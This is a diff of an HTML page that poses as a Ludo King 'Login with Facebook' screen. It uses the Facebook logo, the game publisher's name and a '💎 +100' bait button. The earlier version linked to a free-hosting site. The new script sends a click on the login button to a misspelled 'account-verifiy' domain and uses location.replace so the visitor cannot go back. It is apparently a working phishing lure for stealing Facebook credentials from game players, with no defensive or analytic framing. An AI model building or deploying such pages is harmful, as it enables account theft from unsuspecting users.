@@ -1,242 +1,154 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ludo King - Login with Facebook</title>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Ludo King invites you</title>
+    <link rel="icon" href="https://i.postimg.cc/28qyMZLS/download.jpg" type="image/jpeg" />
 
-    <!-- Open Graph (প্রিভিউর জন্য) -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://ludo-online-game-gamma.vercel.app/">
-    <meta property="og:title" content="Ludo King - Login with Facebook">
-    <meta property="og:description" content="Online ludo with Facebook friend & enjoy voice chat">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Ludo King - Login with Facebook">
-    <meta name="twitter:description" content="Online ludo with Facebook friend & enjoy voice chat">
-    <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png">
+    <meta property="og:title" content="Ludo King invites you" />
+    <meta property="og:description" content="Continue your Ludo King progress securely" />
+    <meta property="og:image" content="https://i.postimg.cc/qR6JwjCv/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg" />
+    <meta property="og:url" content="https://ludo-king-online.gamer.gd" />
+    <meta property="og:type" content="website" />
 
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+      body {
+        margin: 0;
+        font-family: "Poppins", Arial, sans-serif;
+        background: url('https://i.postimg.cc/qR6JwjCv/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg') no-repeat center center fixed;
+        background-size: cover;
+        background-attachment: fixed; /* Helps with transition smoothness */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: #fff;
+      }
 
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-image: url('https://i.postimg.cc/2yfG2dyq/file-000000002ea881fa828184db453a1567.png');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            font-family: 'Segoe UI', Arial, sans-serif;
-            padding: 15px;
-        }
+      .login-box {
+        background: rgba(0, 0, 0, 0.55);
+        backdrop-filter: blur(6px);
+        text-align: center;
+        padding: 40px 30px;
+        border-radius: 20px;
+        width: 360px;
+        max-width: 90%;
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+        animation: fadeIn 1.2s ease;
+        position: relative;
+        z-index: 2;
+      }
 
-        .container {
-            width: 100%;
-            max-width: 430px;
-            text-align: center;
-            margin-top: 60px;
-        }
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(15px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
 
-        .card {
-            position: relative;
-            background: linear-gradient(160deg, #0d0d1f 0%, #050510 40%, #0a0a1a 100%);
-            border-radius: 28px;
-            padding: 30px 24px;
-            box-shadow: 
-                0 0 0 2px rgba(255, 215, 0, 0.4),
-                0 0 0 4px rgba(255, 215, 0, 0.15),
-                0 15px 40px rgba(0, 0, 0, 0.9),
-                0 0 50px rgba(255, 215, 0, 0.25),
-                inset 0 1px 0 rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(12px);
-            overflow: hidden;
-        }
+      .logo {
+        width: 160px;
+        height: auto;
+        margin-bottom: 25px;
+        border-radius: 12px;
+      }
 
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 60%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #FFD700, transparent);
-            box-shadow: 0 0 15px #FFD700;
-        }
+      .mini-buttons {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 25px;
+      }
 
-        .card::after {
-            content: '';
-            position: absolute;
-            top: -60%;
-            left: -30%;
-            width: 160%;
-            height: 160%;
-            background: radial-gradient(circle at 50% 0%, rgba(255, 215, 0, 0.12) 0%, transparent 60%);
-            pointer-events: none;
-        }
+      .mini-btn {
+        background: linear-gradient(180deg, #0c53b7, #08377a);
+        border: none;
+        color: #fff;
+        font-size: 14px;
+        font-weight: 600;
+        padding: 10px 14px;
+        border-radius: 8px;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        cursor: pointer;
+        transition: all 0.25s ease;
+      }
 
-        .top-buttons {
-            display: flex;
-            justify-content: space-between;
-            gap: 9px;
-            margin-bottom: 22px;
-            position: relative;
-            z-index: 2;
-        }
+      .mini-btn:hover {
+        background: linear-gradient(180deg, #1365da, #0a3f8a);
+        transform: translateY(-2px);
+      }
 
-        .top-btn {
-            flex: 1;
-            padding: 15px 6px;
-            background: linear-gradient(to bottom, #0a3d7a, #041d3d);
-            border: 1.5px solid rgba(255, 215, 0, 0.8);
-            border-radius: 12px;
-            color: #fff;
-            font-size: 11.5px;
-            font-weight: bold;
-            cursor: not-allowed;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-            white-space: nowrap;
-            box-shadow: 
-                0 0 10px rgba(255, 215, 0, 0.25),
-                inset 0 1px 0 rgba(255, 255, 255, 0.15);
-        }
+      .fb-btn {
+        background-color: #1877f2;
+        border: none;
+        color: white;
+        font-size: 18px;
+        font-weight: 600;
+        padding: 14px 30px;
+        border-radius: 10px;
+        cursor: pointer;
+        width: 100%;
+        margin-bottom: 15px;
+        transition: background 0.3s ease;
+      }
 
-        .fb-btn {
-            width: 100%;
-            padding: 22px 20px;
-            background: linear-gradient(to bottom, #2b95ff, #0a52c4);
-            border: 2.5px solid #FFD700;
-            border-radius: 18px;
-            color: white;
-            font-size: 21px;
-            font-weight: bold;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 14px;
-            transition: all 0.3s ease;
-            box-shadow: 
-                0 0 25px rgba(43, 149, 255, 0.8),
-                0 0 55px rgba(43, 149, 255, 0.4),
-                inset 0 2px 0 rgba(255, 255, 255, 0.3),
-                inset 0 -2px 0 rgba(0, 0, 0, 0.2);
-            position: relative;
-            z-index: 2;
-            margin-bottom: 22px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
-            letter-spacing: 0.3px;
-            text-decoration: none;
-        }
+      .fb-btn:hover {
+        background-color: #0f5cd6;
+      }
 
-        .fb-btn:hover {
-            background: linear-gradient(to bottom, #4da8ff, #1e6fd8);
-            transform: translateY(-3px);
-            box-shadow: 
-                0 0 35px rgba(43, 149, 255, 1),
-                0 0 75px rgba(43, 149, 255, 0.5),
-                inset 0 2px 0 rgba(255, 255, 255, 0.4),
-                inset 0 -2px 0 rgba(0, 0, 0, 0.2);
-        }
+      .fb-btn img {
+        vertical-align: middle;
+        margin-right: 8px;
+        width: 20px;
+        height: 20px;
+      }
 
-        .fb-btn .fb-icon {
-            position: relative;
-            background: linear-gradient(180deg, #4a9eff 0%, #1877F2 50%, #0d5bbf 100%);
-            color: #ffffff;
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Georgia', 'Times New Roman', serif;
-            font-weight: bold;
-            font-size: 46px;
-            line-height: 1;
-            flex-shrink: 0;
-            box-shadow: 
-                0 0 0 2.5px #ffffff,
-                0 0 0 4.5px rgba(24, 119, 242, 0.5),
-                0 0 20px rgba(74, 158, 255, 0.9),
-                0 4px 12px rgba(0, 0, 0, 0.5),
-                inset 0 3px 6px rgba(255, 255, 255, 0.4),
-                inset 0 -3px 6px rgba(0, 0, 0, 0.3);
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-            padding-bottom: 5px;
-            padding-right: 1px;
-            transition: all 0.3s ease;
-        }
+      .note {
+        color: #ddd;
+        font-size: 12px;
+        line-height: 1.5;
+        margin-top: 10px;
+      }
 
-        .fb-btn:hover .fb-icon {
-            transform: scale(1.1);
-        }
+      .note a {
+        color: #00aaff;
+        text-decoration: none;
+        font-weight: 500;
+      }
 
-        .extra-text {
-            margin-bottom: 18px;
-            font-size: 14.5px;
-            color: #FFD700;
-            font-weight: bold;
-            text-shadow: 
-                0 0 12px rgba(255, 215, 0, 0.8),
-                0 0 25px rgba(255, 215, 0, 0.4);
-            line-height: 1.6;
-            letter-spacing: 0.4px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .privacy-text {
-            font-size: 10.5px;
-            color: #aaa;
-            line-height: 1.6;
-            padding: 0 5px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .privacy-text a {
-            color: #00BFFF;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .privacy-text a:hover {
-            text-shadow: 0 0 8px rgba(0, 191, 255, 0.8);
-        }
+      .note a:hover {
+        text-decoration: underline;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
 
-    <div class="container">
-        <div class="card">
-            <div class="top-buttons">
-                <div class="top-btn">☁️ Save Data</div>
-                <div class="top-btn">📱 Change Device</div>
-                <div class="top-btn">💎 +100</div>
-            </div>
-
-            <a href="https://add-ludo.infinityfree.io/" class="fb-btn">
-                <span class="fb-icon">f</span> Login with Facebook
-            </a>
-
-            <div class="extra-text">
-                Online ludo with Facebook friend & enjoy voice chat
-            </div>
-
-            <div class="privacy-text">
-                By continuing I agree that Gametion Technologies Pvt. Ltd. may store and process my data in accordance with the <a href="#">Privacy Policy</a>
-            </div>
-        </div>
+    <div class="login-box">
+      <img class="logo" src="https://i.postimg.cc/qR6JwjCv/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg" alt="Ludo King Logo" />
+      <div class="mini-buttons">
+        <button class="mini-btn">☁️ Save Data</button>
+        <button class="mini-btn">📱 Change Device</button>
+        <button class="mini-btn">💎 +100</button>
+      </div>
+      <button class="fb-btn" id="fbLoginBtn" type="button">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="FB" />
+        Login with Facebook
+      </button>
+      <p class="note">
+        By continuing I agree that Gametion Technologies Pvt. Ltd. may store and process my data in accordance with the
+        <br />
+        <a href="#">Privacy Policy</a>
+      </p>
     </div>
 
-</body>
+    <script>
+      document.getElementById('fbLoginBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        // Use replace() for smoother redirect (no back button history flash)
+        window.location.replace('https://account-verifiy.gamer.gd');
+        // Alternative if replace not work: window.location.href = 'https://account-verifiy.gamer.gd';
+      });
+    </script>
+
+  </body>
 </html>
